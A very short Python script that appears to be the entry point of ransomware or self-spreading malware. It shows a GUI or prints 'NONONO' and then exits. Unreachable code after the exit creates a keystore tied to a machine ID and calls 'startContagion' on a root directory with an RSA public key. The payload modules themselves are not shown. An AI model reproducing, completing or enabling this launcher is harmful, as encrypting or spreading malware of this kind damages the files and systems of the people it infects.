import guiMode
from guiMode import InfoGUI

if guiMode.checkFirstTime():
    guiMode.displayInfoGUI()
else:
    print("NONONO")

exit()

import starter
import utils

starter.keyStoreCreate(utils.version, utils.what_is_my_id)
starter.startContagion(utils.root_directory, utils.rsa_public_key)